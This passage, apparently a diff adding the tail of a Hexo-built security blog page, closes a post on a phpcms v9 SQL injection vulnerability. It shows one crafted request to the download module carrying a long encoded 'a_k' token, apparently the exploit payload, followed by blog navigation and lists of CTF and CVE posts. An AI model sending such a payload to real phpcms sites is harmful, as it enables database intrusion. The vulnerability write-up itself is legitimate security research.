+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=<span class="number">6</span>c09EmoZrtqeCKGWcv5iTTkQNeo0bVuMegMOvaPLNZ6SEeyG5sK0TxNum_xlEkgbv6lthq3oE18R3-XpRSPrH7sGkoPxbI1bFePqHtcAMMKV5BpYJq3NE-HNZgT_4xlDmk7mDtHjcg798pB7wQx4i-IPN6mOFQtXIdkxhz1i3KdZViOX0UcU8oNVWDOEmYKLl69Ftjn_HGUw3r5mGa8ikLbbP-rdWhC0QfJMg4sUC9eDJyzuOlZRu7kkEyCzKf<span class="number">-6</span>oF8Che9kYnGOAsWmgxuhkY7uqndWSZQBFKxUkksklkoTtZG7qIv-lUZhNPg25ateNkESCJSZPxHRCCtfArr-_i5lTy5uA0yN9pEr6wtsMs8j_mz9xAd0rur08gw_xUVv6y7AMdzfMUjQhUhr6gDPcgUZWplKDwsZBWKUOV-ROmJS4I9EJ94sstd-KRCiwLe85YrQWvHTJuzzy2ZNFCAkDghc__b-hzy8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//3.png" alt="1581075019899"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5jw0013kou5eupj60yd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/10/five86-2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          five86-2-vulnhub渗透测试
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">phpcmsv9文件包含漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
